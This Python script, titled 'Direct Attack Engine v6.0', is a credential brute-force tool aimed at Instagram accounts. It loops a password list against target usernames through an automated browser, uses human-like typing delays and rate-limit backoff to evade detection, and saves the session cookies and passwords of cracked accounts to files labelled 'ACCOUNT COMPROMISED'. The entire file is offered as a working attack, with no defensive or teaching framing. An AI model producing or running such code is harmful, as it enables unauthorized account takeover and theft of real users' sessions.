#!/usr/bin/env python3
"""
🔥 DIRECT ATTACK ENGINE v6.0 🔥
Direct Instagram Brute Force - No Proxy Required!

This bypasses all proxy detection by using direct connections
with advanced anti-detection techniques.
"""

import os
import sys
import json
import time
import random
import logging
import requests
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import threading

# Add modules path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from ultimate_browser_manager import UltimateBrowserManager

class DirectInstagramEngine:
    """🔥 Direct Instagram Attack Engine - Maximum Power, No Proxies"""
    
    def __init__(self):
        self.results = {
            'successful_attacks': [],
            'failed_attempts': [],
            'statistics': {
                'total_attempts': 0,
                'successful_logins': 0,
                'failed_logins': 0,
                'start_time': None,
                'end_time': None
            }
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"logs/direct_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def load_targets(self, targets_file: str = "targets.txt") -> List[str]:
        """Load target usernames"""
        try:
            with open(targets_file, 'r') as f:
                targets = [line.strip() for line in f.readlines() if line.strip()]
            self.logger.info(f"Loaded {len(targets)} targets")
            return targets
        except FileNotFoundError:
            self.logger.error(f"Targets file {targets_file} not found")
            return []
    
    def load_passwords(self, passwords_file: str = "common_passwords.txt") -> List[str]:
        """Load password list"""
        try:
            with open(passwords_file, 'r') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
            return passwords
        except FileNotFoundError:
            self.logger.error(f"Passwords file {passwords_file} not found")
            return []
    
    def attempt_direct_login(self, username: str, password: str) -> Dict:
        """Direct login attempt without proxy"""
        attempt_result = {
            'username': username,
            'password': password,
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'method': 'direct_browser',
            'error': None,
            'session_data': None
        }
        
        browser_manager = None
        
        try:
            self.logger.info(f"🎯 Direct attack: {username}:{password}")
            
            # Create browser manager WITHOUT proxy
            browser_manager = UltimateBrowserManager(proxy_config=None, debug=True)
            
            # Setup virtual display
            if not browser_manager.setup_virtual_display():
                raise Exception("Failed to setup virtual display")
            
            # Create browser session
            browser = browser_manager.create_browser_session()
            if not browser:
                raise Exception("Failed to create browser session")
            
            # Navigate to Instagram login
            self.logger.info("Navigating to Instagram...")
            browser.get("https://www.instagram.com/accounts/login/")
            
            # Wait for page to load
            time.sleep(random.uniform(3, 6))
            
            # Check if page loaded properly
            current_url = browser.current_url
            self.logger.info(f"Current URL: {current_url}")
            
            # Look for username field with multiple strategies
            username_field = None
            selectors = [
                'input[name="username"]',
                'input[aria-label="Phone number, username, or email"]',
                'input[placeholder*="username"]',
                'input[placeholder*="phone"]',
                'input[placeholder*="email"]'
            ]
            
            for selector in selectors:
                try:
                    elements = browser.find_elements("css selector", selector)
                    if elements and elements[0].is_displayed():
                        username_field = elements[0]
                        self.logger.info(f"Found username field with selector: {selector}")
                        break
                except:
                    continue
            
            if not username_field:
                # Try to find any input field
                try:
                    all_inputs = browser.find_elements("tag name", "input")
                    for inp in all_inputs:
                        if inp.is_displayed() and inp.get_attribute("type") in ["text", "email", "tel"]:
                            username_field = inp
                            self.logger.info("Found username field by type detection")
                            break
                except:
                    pass
            
            if not username_field:
                raise Exception("Could not find username field")
            
            # Type username
            self.logger.info("Typing username...")
            username_field.clear()
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            # Find password field
            password_field = None
            password_selectors = [
                'input[name="password"]',
                'input[type="password"]',
                'input[aria-label="Password"]'
            ]
            
            for selector in password_selectors:
                try:
                    elements = browser.find_elements("css selector", selector)
                    if elements and elements[0].is_displayed():
                        password_field = elements[0]
                        self.logger.info(f"Found password field with selector: {selector}")
                        break
                except:
                    continue
            
            if not password_field:
                raise Exception("Could not find password field")
            
            # Type password
            self.logger.info("Typing password...")
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            
            # Find and click login button
            login_button = None
            button_selectors = [
                'button[type="submit"]',
                'button:contains("Log in")',
                'button:contains("Sign in")',
                'div[role="button"]:contains("Log in")'
            ]
            
            for selector in button_selectors:
                try:
                    if ":contains" in selector:
                        # Use XPath for text content
                        xpath = f"//*[contains(text(), 'Log in') or contains(text(), 'Sign in')]"
                        elements = browser.find_elements("xpath", xpath)
                    else:
                        elements = browser.find_elements("css selector", selector)
                    
                    for element in elements:
                        if element.is_displayed() and element.is_enabled():
                            login_button = element
                            self.logger.info(f"Found login button: {element.tag_name}")
                            break
                    
                    if login_button:
                        break
                except:
                    continue
            
            if not login_button:
                # Try Enter key instead
                self.logger.info("No login button found, trying Enter key...")
                password_field.send_keys("\n")
            else:
                self.logger.info("Clicking login button...")
                login_button.click()
            
            # Wait for response
            time.sleep(random.uniform(4, 8))
            
            # Check login result
            current_url = browser.current_url
            self.logger.info(f"After login URL: {current_url}")
            
            # Check for success indicators
            if '/accounts/login/' not in current_url:
                self.logger.success(f"🎉 SUCCESS! Login successful for {username}")
                
                # Extract session data
                cookies = browser.get_cookies()
                session_data = {
                    'cookies': {cookie['name']: cookie for cookie in cookies},
                    'current_url': current_url,
                    'timestamp': datetime.now().isoformat(),
                    'user_agent': browser.execute_script("return navigator.userAgent;"),
                    'success': True
                }
                
                attempt_result['success'] = True
                attempt_result['session_data'] = session_data
                
                # Save immediately
                self._save_successful_session(username, password, session_data)
                
            else:
                # Check for error messages
                error_text = ""
                try:
                    page_text = browser.page_source.lower()
                    if 'incorrect' in page_text or 'wrong' in page_text:
                        error_text = "Invalid credentials"
                    elif 'suspended' in page_text or 'disabled' in page_text:
                        error_text = "Account suspended"
                    elif 'challenge' in page_text or 'verify' in page_text:
                        error_text = "Challenge required"
                    else:
                        error_text = "Login failed"
                except:
                    error_text = "Unknown error"
                
                attempt_result['error'] = error_text
                self.logger.info(f"Login failed: {error_text}")
            
        except Exception as e:
            attempt_result['error'] = str(e)
            self.logger.error(f"Attack attempt failed: {e}")
            
        finally:
            # Cleanup
            if browser_manager:
                browser_manager.cleanup()
            
            # Update statistics
            self.results['statistics']['total_attempts'] += 1
            if attempt_result['success']:
                self.results['statistics']['successful_logins'] += 1
                self.results['successful_attacks'].append(attempt_result)
            else:
                self.results['statistics']['failed_logins'] += 1
                self.results['failed_attempts'].append(attempt_result)
        
        return attempt_result
    
    def _save_successful_session(self, username: str, password: str, session_data: Dict):
        """Save successful session immediately"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/SUCCESSFUL_ATTACK_{username}_{timestamp}.json"
            
            session_info = {
                'target': username,
                'password': password,
                'timestamp': timestamp,
                'session_data': session_data,
                'attack_method': 'direct_browser',
                'success': True,
                'note': '🔥 ACCOUNT COMPROMISED 🔥'
            }
            
            os.makedirs('output', exist_ok=True)
            with open(filename, 'w') as f:
                json.dump(session_info, f, indent=2)
            
            self.logger.success(f"🔥 COMPROMISED ACCOUNT SAVED: {filename}")
            
            # Also save to main results file
            main_file = f"output/ALL_COMPROMISED_ACCOUNTS_{datetime.now().strftime('%Y%m%d')}.json"
            try:
                if os.path.exists(main_file):
                    with open(main_file, 'r') as f:
                        all_compromised = json.load(f)
                else:
                    all_compromised = []
                
                all_compromised.append(session_info)
                
                with open(main_file, 'w') as f:
                    json.dump(all_compromised, f, indent=2)
                
                self.logger.success(f"Added to main compromised list: {len(all_compromised)} total")
                
            except Exception as e:
                self.logger.error(f"Failed to update main compromised list: {e}")
            
        except Exception as e:
            self.logger.error(f"Failed to save successful session: {e}")
    
    def attack_target(self, username: str, passwords: List[str]) -> Dict:
        """Attack a single target"""
        self.logger.info(f"🎯 ATTACKING TARGET: {username}")
        
        for i, password in enumerate(passwords):
            self.logger.info(f"Attempt {i+1}/{len(passwords)}: {password}")
            
            # Add delay between attempts
            if i > 0:
                delay = random.uniform(5, 15)  # Longer delays to avoid rate limiting
                self.logger.info(f"Waiting {delay:.1f}s before next attempt...")
                time.sleep(delay)
            
            result = self.attempt_direct_login(username, password)
            
            if result['success']:
                self.logger.success(f"🔥🔥🔥 TARGET COMPROMISED: {username} 🔥🔥🔥")
                return {'success': True, 'result': result}
            
            # Check for rate limiting
            if result.get('error'):
                error_msg = result['error'].lower()
                if 'rate limit' in error_msg or 'too many' in error_msg:
                    self.logger.warning("Rate limit detected, waiting longer...")
                    time.sleep(random.uniform(30, 60))
        
        return {'success': False, 'total_tried': len(passwords)}
    
    def run_attack(self, targets_file: str = "targets.txt", 
                   passwords_file: str = "common_passwords.txt") -> Dict:
        """Run the complete attack"""
        self.logger.info("🔥🔥🔥 STARTING DIRECT INSTAGRAM ATTACK 🔥🔥🔥")
        self.results['statistics']['start_time'] = datetime.now().isoformat()
        
        # Load targets and passwords
        targets = self.load_targets(targets_file)
        passwords = self.load_passwords(passwords_file)
        
        if not targets or not passwords:
            self.logger.error("No targets or passwords loaded")
            return self.results
        
        self.logger.info(f"🎯 Targets: {targets}")
        self.logger.info(f"🔑 Passwords: {len(passwords)} loaded")
        
        # Attack each target
        for target in targets:
            try:
                result = self.attack_target(target, passwords)
                if result.get('success'):
                    self.logger.success(f"🎉 SUCCESS! {target} COMPROMISED!")
                else:
                    self.logger.warning(f"Failed to compromise {target}")
            except Exception as e:
                self.logger.error(f"Error attacking {target}: {e}")
        
        # Finalize results
        self.results['statistics']['end_time'] = datetime.now().isoformat()
        self._save_final_results()
        
        return self.results
    
    def _save_final_results(self):
        """Save final results"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/direct_attack_results_{timestamp}.json"
            
            os.makedirs('output', exist_ok=True)
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            
            # Print summary
            stats = self.results['statistics']
            self.logger.info("🔥 ATTACK COMPLETE 🔥")
            self.logger.info(f"Total attempts: {stats['total_attempts']}")
            self.logger.info(f"Successful logins: {stats['successful_logins']}")
            
            if stats['successful_logins'] > 0:
                self.logger.success(f"🎯 {stats['successful_logins']} ACCOUNTS COMPROMISED!")
            else:
                self.logger.warning("No accounts compromised")
                
        except Exception as e:
            self.logger.error(f"Failed to save results: {e}")

def main():
    """Main entry point"""
    try:
        print("🔥" * 60)
        print("🔥 DIRECT INSTAGRAM ATTACK ENGINE v6.0")
        print("🔥 Maximum Power - No Proxy Required!")
        print("🔥" * 60)
        
        # Create engine
        engine = DirectInstagramEngine()
        
        # Run attack
        results = engine.run_attack()
        
        return results
        
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        return None
    except Exception as e:
        print(f"❌ Critical error: {e}")
        return None

if __name__ == "__main__":
    main()
